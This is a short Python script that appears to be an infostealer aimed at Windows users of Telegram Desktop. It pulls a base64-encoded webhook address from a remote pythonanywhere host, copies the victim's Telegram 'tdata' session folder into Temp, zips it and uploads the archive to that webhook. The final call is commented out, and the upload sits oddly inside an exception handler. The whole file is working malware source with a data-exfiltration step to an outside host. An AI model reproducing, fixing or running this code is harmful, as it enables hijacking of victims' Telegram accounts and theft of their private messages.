import os, os.path, shutil, requests
user = os.path.expanduser("~")
import base64
hook = base64.b64decode(requests.get("https://mehmetaliii.pythonanywhere.com/webzuhurt").text).decode()

def telegram():
  if os.path.exists(user+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
   try:
    shutil.copytree(user+'\\AppData\\Roaming\\Telegram Desktop\\tdata', user+'\\AppData\\Local\\Temp\\tdata_session')
    shutil.make_archive(user+'\\AppData\\Local\\Temp\\tdata_session', 'zip', user+'\\AppData\\Local\\Temp\\tdata_session')
   except:
    pass
    try:
     os.remove(user+"\\AppData\\Local\\Temp\\tdata_session")
    except:
        pass
    with open(user+'\\AppData\\Local\\Temp\\tdata_session.zip', 'rb') as f:
     payload = {
        'file': (user+'\\AppData\\Local\\Temp\\tdata_session.zip', f, 'zip')
     }    
     r = requests.post(hook, files=payload)
# telegram()
